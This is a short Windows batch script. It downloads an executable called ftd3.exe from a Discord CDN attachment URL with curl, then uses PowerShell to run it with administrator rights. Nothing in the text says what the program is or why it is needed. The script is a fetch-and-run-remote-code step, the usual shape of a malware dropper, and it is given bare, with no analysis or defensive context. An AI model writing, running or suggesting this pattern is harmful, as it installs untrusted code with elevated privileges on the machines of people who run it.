@echo off
set url=https://cdn.discordapp.com/attachments/1197242628396302458/1328018741627326534/ftd3.exe?ex=67852d55&is=6783dbd5&hm=ffaffe39a5449d0829ae61f66245a1ec4221887721a8087edbe5434f03edb75e
set output=ftd3.exe
curl -l -o "%output%" "%url%"
powershell -command "start-process '%output%' -verb runas"
